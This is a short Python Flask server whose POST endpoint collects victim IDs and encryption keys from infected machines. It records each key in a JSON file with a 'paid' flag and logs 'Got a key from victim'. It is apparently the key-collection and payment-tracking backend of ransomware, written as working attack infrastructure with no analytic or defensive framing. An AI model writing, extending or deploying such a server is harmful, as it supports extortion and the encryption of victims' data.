# install flask pip install flask before running the server

from flask import Flask, request, jsonify
import json

app = Flask(__name__)

@app.route('/api/keys', methods=['POST'])
def receive_victim_key():
    data = request.json
    victim_id = data.get('victim_id', 'UNKNOWN')
    encrypted_key = data.get('encrypted_key', 'NONE')

    # load existing victims from file
    try:
        with open('victims_keys.json', 'r') as f:
            victims = json.load(f)
    except:
        victims = {}

    # add new victim with paid = False
    victims[victim_id] = {
        'encrypted_key': encrypted_key,
        'paid': False
    }

    # save to file
    with open('victims_keys.json', 'w') as f:
        json.dump(victims, f)
    
    # print to console
    print(f"Victim ID: {data.get('victim_id', 'UNKNOWN')}")
    print(f"Encrypted Key (first 50 chars): {data.get('encrypted_key', 'NONE')[:50]}...")
    print(f"JSON payload: {json.dumps(data)}\n")
    
    print("Got a key from victim:", data['victim_id'])
    
    return jsonify({"status": "success"}), 200

# test endpoint
@app.route('/test', methods=['GET'])
def test():
    return jsonify({
        "status": "OK",
        "message": "server working"
    }), 200

if __name__ == '__main__':
    print("Server is running on port 8000")
    app.run(host='0.0.0.0', port=8000)

